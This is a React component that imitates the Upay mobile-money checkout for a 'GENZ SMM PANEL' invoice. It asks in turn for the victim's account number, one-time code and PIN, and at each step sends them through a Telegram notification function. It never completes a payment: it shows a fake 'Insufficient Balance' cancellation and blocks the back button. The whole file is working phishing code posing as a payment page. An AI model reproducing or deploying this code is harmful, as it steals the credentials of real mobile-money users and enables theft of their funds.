import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
import upayLogo from "@/assets/upay-logo-full.svg";

const UpayPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const isAllowed = usePaymentMethodGuard("upay");
  const [mobileNumber, setMobileNumber] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  const [step, setStep] = useState<'mobile' | 'otp' | 'pin'>('mobile');
  const [showError, setShowError] = useState("");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [pinAttempts, setPinAttempts] = useState(0);
  const [isLoading, setIsLoading] = useState(false);

  const mobileRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);

  const invoiceNumber = "12117746247398975";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  useEffect(() => {
    if (step === 'mobile') setTimeout(() => mobileRef.current?.focus(), 100);
    if (step === 'otp') setTimeout(() => otpRef.current?.focus(), 100);
    if (step === 'pin') setTimeout(() => pinRef.current?.focus(), 100);
  }, [step]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileNumber.length === 11 && validPrefixes.includes(mobileNumber.substring(0, 3)) && /^\d+$/.test(mobileNumber);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 11));
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPin(e.target.value.replace(/\D/g, "").slice(0, 4));
  };

  const handleMobileSubmit = () => {
    if (!isValidMobile()) return;
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber });
    setTimeout(() => {
      setStep('otp');
      setIsLoading(false);
    }, 2000);
  };

  const handleOtpSubmit = () => {
    if (otp.length < 4) {
      setShowError("Please enter the verification code.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp });
    setTimeout(() => {
      setStep('pin');
      setIsLoading(false);
    }, 2000);
  };

  const handlePinSubmit = () => {
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin });
    setTimeout(() => {
      setIsLoading(false);
      navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
    }, 2000);
  };

  const handleClose = () => {
    navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}.00`);
  };

  const renderContent = () => {
    if (step === 'pin') {
      return (
        <>
          <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter your PIN</p>
          {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
          <input ref={pinRef} type="password" inputMode="numeric" value={pin} onChange={handlePinChange} placeholder="PIN"
            className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
          <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
        </>
      );
    }
    if (step === 'otp') {
      return (
        <>
          <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter verification code</p>
          {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
          <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange} placeholder="Verification code"
            className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
          <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
        </>
      );
    }
    const mobileValid = isValidMobile();
    return (
      <>
        <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter Your upay Account Number</p>
        {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
        <input ref={mobileRef} type="text" inputMode="numeric" value={mobileNumber} onChange={handleMobileChange} placeholder="e.g 01XXXXXXXXX"
          className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
        <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
      </>
    );
  };

  const mobileValid = isValidMobile();
  const confirmEnabled = step === 'mobile' ? mobileValid : step === 'otp' ? otp.length === 6 : pin.length === 4;
  const handleSubmit = step === 'mobile' ? handleMobileSubmit : step === 'otp' ? handleOtpSubmit : handlePinSubmit;
  const isDisabled = !confirmEnabled || isLoading;
  const confirmBgColor = (confirmEnabled && !isLoading) ? 'rgb(36, 76, 154)' : '#aaa';

  if (isAllowed !== true) return null;

  return (
    <div className="h-[100dvh] w-screen flex flex-col items-center justify-center overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
      {isLoading && <DualCircleLoader />}
      <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg flex flex-col" style={{ maxHeight: 'calc(100dvh - 2rem)' }}>
        
        {/* Yellow upper section - logo, invoice, input */}
        <div className="px-5 pt-6 pb-6 flex flex-col items-center overflow-auto" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
          {/* Logo */}
          <img src={upayLogo} alt="Upay" className="w-48 min-[375px]:w-64 h-auto object-contain mb-4" />

          {/* Invoice info box */}
          <div className="w-full rounded-xl px-4 py-4 mb-5 text-center" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
            <p className="font-extrabold text-[#1a1a1a] text-base">GENZ SMM PANEL</p>
            <p className="text-[#444] text-sm font-bold mt-1">Invoice Number:</p>
            <p className="font-extrabold text-[#1a1a1a] text-sm">{invoiceNumber}</p>
            <p className="text-[#444] text-sm font-bold mt-1">Amount: <span className="font-extrabold text-[#1a1a1a] text-base">BDT {amount}</span></p>
          </div>

          {/* Input area */}
          <div className="w-full">{renderContent()}</div>
        </div>

        {/* White bottom section - buttons */}
        <div className="bg-white px-5 py-4 shrink-0">
          <div className="flex items-center justify-between">
            <button onClick={handleClose} className="border border-[#bbb] rounded-lg px-6 py-2.5 text-sm font-bold text-[#333] bg-white hover:bg-[#f5f5f5]">Close</button>
            <button
              onClick={handleSubmit}
              disabled={isDisabled}
              className="rounded-lg px-6 py-2.5 text-sm font-bold transition-colors text-white"
              style={{ backgroundColor: isDisabled ? '#aaa' : confirmBgColor, cursor: isDisabled ? 'not-allowed' : 'pointer' }}
            >Confirm</button>
          </div>
        </div>

        {/* Footer */}
        <div className="py-2.5 flex items-center justify-center gap-1.5 bg-white border-t border-[#eee] shrink-0">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#0054A5">
            <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
          </svg>
          <span className="text-[#0054A5] font-extrabold text-sm">16268</span>
        </div>
      </div>
    </div>
  );
};

export default UpayPayment;
